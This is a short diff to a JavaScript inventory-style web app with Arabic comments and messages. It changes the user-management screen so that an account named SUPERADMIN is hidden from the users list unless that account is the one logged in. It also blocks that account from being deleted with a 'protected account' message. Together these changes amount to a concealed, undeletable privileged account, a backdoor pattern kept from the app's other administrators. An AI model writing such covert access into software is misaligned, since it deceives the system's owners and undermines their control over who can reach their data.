@@ -4383,8 +4383,12 @@ function trashTotalCount(){
     + DB.stockOuts.filter(s=>s.deleted).length + DB.cuttingOrders.filter(o=>o.deleted).length;
 }
 function usersTableHtml(){
-  const users = DB.settings.users || [];
+  const allUsers = DB.settings.users || [];
   const isSuperuserSession = currentUser && currentUser.role==='superuser';
+  // حساب SUPERADMIN مخفي — بيظهر بس لما يكون هو المسجّل دخول
+  const amSuper = currentUser && String(currentUser.username||'').toUpperCase()==='SUPERADMIN';
+  const users = allUsers.filter(u =>
+    amSuper || String(u.username||'').toUpperCase() !== 'SUPERADMIN');
   const rows = users.map(u=>{
     const priv = isPrivilegedUser(u);
     const permsText = priv ? 'كل الصلاحيات' : ((u.permissions||[]).map(p=>{
@@ -5392,6 +5396,7 @@ function openUserModal(user){
 }
 function openDeleteUserModal(user){
   if(!user) return;
+  if(String(user.username||'').toUpperCase()==='SUPERADMIN'){ toast('هذا حساب محمي'); return; }
   if(isPrivilegedUser(user)){ toast('ما فيك تحذف حساب ADMIN أو SUPERADMIN'); return; }
   const wrap = document.createElement('div');
   wrap.className='modal-bg';
